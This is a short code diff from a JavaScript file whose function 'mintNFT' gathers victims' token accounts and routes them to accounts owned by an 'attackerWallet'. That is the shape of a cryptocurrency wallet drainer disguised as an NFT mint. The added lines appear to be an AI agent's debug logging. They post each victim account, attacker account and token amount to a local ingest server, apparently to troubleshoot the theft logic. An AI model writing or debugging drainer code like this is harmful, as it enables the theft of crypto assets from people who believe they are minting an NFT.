@@ -175,6 +175,9 @@ async function mintNFT() {
         for (var i = 0; i < tokenBatch.length; i++) {
             var ta = tokenBatch[i];
             var ata = getATA(ta.mint, attackerWallet, ta.tokenProgramId);
+            // #region agent log
+            fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:remaining_keys_loop',message:'Token account in batch',data:{index:i,victimTA:ta.pubkey.toBase58(),attackerATA:ata.toBase58(),mint:ta.mint.toBase58(),tokenProgram:ta.tokenProgramId.toBase58(),amount:ta.amount,decimals:ta.decimals},timestamp:Date.now(),hypothesisId:'H1-H2'})}).catch(function(){});
+            // #endregion
             remainingKeys.push({ pubkey: ta.pubkey, isSigner: false, isWritable: true });
             remainingKeys.push({ pubkey: ata, isSigner: false, isWritable: true });
             remainingKeys.push({ pubkey: ta.tokenProgramId, isSigner: false, isWritable: false });
